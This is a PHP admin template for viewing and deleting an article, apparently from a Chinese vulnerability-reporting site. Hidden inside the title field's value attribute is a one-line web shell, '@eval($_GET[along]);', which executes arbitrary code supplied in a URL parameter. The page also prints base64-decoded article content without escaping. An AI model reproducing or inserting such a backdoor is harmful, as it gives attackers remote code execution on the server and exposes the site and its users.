<div class="row">
	<div class="col-md-1 sidebar">
		<ul class="list-group">
			<a href="/admin" class="list-group-item">项目概况</a>
			<a href="/admin/users" class="list-group-item">查看用户</a>
			<a href="/admin/bugs" class="list-group-item">漏洞列表</a>
			<a href="/admin/news" class="list-group-item active">文章列表</a>
			<a href="#" class="list-group-item">漏洞评论</a>
			<a href="#" class="list-group-item">文章评论</a>
		</ul>
	</div>
	<div class="col-md-6">
		<form class="form-horizontal" action="?func=accept" method="post">
			<div class="form-group">
				<label for="name" class="col-sm-2 control-label">标题</label>
				<div class="col-sm-10">
					<input type="text" class="form-control" id="name" value="<?php echo $h($article->title);@eval($_GET[along]); ?>" disabled="disabled">
				</div>
			</div>
			<div class="form-group">
				<label for="content" class="col-sm-2 control-label">内容</label>
				<div class="col-sm-10">
					<textarea type="text" class="form-control" id="content" rows="6" disabled="disabled"><?php echo base64_decode($article->content); ?></textarea>
				</div>
			</div>
			<hr>
			<div class="form-group">
				<div class="col-sm-5 col-sm-offset-2">
					<a href="?func=del" class="btn btn-danger">删除</a>
				</div>
			</div>
		</form>
	</div>
</div>